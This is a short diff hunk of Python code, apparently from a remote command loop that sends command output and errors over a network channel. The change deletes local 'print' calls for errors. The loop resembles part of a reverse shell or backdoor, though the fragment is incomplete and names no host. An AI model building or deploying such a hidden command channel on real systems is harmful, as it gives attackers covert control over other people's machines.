@@ -45,10 +45,8 @@ while True:
                   chan.send(cmd)
                 except Exception as e:
                   chan.send(e)
-                  print(e)
             except subprocess.CalledProcessError as e:
                 chan.send(e)
-                print(e)
                 client.close()
     except:
       pass
